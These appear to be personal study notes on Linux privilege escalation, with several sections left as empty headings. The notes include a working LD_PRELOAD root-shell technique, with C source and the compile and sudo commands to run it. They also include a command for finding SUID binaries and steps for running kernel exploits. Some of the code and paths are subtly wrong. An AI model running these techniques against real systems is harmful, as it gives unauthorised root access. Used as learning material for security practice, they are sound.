## Kernel Exploit

1. Identify the kernel version
```bash
uname -r

# read proc file
cat /etc/proc
```
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit
## Sudo

- Run command to check what program current user can run
```bash
sudo -l
```

	If see `env_keep+=LD_PRELOAD` option, this allow any program to run share library.
	This may lead to spawn a root shell.

- Create a shell with C share library
```C
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0); // group id in system
	setuid(0); // user id in system
	// if group id or user id is not match with the system, it will not working anymore.
	system('/bin/bash');
}
```
```bash
# Compile source code to .so file
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# run the program with LD_PRELOAD option
$find = _program_name
sudo LD_PRELOAD=/home/user/ldpreload/shell.so $find
```

## SUID

Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.

```bash
# Using find command to show special permission of executable file
find / -type f -perm -04000 -ls 2>/dev/null
```
	Using (https://gtfobins.github.io/)[gTFObins] to get how to run the executable file with SUID available

## Capabilities

## Cron Job

## PATH

## NFS